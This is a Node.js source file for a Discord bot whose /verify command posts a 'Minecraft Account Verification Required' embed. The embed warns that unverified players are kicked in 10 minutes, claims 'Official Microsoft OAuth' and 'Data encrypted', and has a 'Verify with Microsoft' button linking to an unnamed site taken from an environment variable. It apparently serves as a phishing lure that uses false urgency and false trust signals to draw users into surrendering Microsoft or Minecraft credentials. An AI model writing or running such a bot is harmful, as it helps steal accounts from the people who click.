require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages
  ] 
});

client.once('ready', () => {
  console.log(`✅ Bot Online: ${client.user.tag}`);
  
  const command = {
    name: 'verify',
    description: 'Verify your Minecraft account to access the server'
  };
  
  client.application.commands.create(command)
    .then(() => console.log('✅ /verify command registered'))
    .catch(console.error);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'verify') {
    const embed = new EmbedBuilder()
      .setTitle('🔐 Minecraft Account Verification Required')
      .setDescription('**To gain access to the server, please verify your Minecraft account.**\n\n⚠️ Unverified players will be automatically kicked in 10 minutes.\n\nThis process takes less than 30 seconds and uses official Microsoft authentication.')
      .setColor('#2ecc71')
      .setThumbnail('https://i.imgur.com/ZKFoq9L.png')
      .addFields(
        { name: '✅ Safe & Secure', value: 'Official Microsoft OAuth', inline: true },
        { name: '⚡ Quick Process', value: 'Takes 30 seconds', inline: true },
        { name: '🔒 Privacy Protected', value: 'Data encrypted', inline: true }
      )
      .setFooter({ text: 'Click the button below to start verification' })
      .setTimestamp();

    const button = new ButtonBuilder()
      .setLabel('Verify with Microsoft')
      .setStyle(ButtonStyle.Link)
      .setURL(process.env.WEBSITE_URL)
      .setEmoji('✅');

    const row = new ActionRowBuilder().addComponents(button);

    await interaction.reply({ 
      embeds: [embed], 
      components: [row], 
      ephemeral: true 
    });
  }
});

client.login(process.env.BOT_TOKEN);
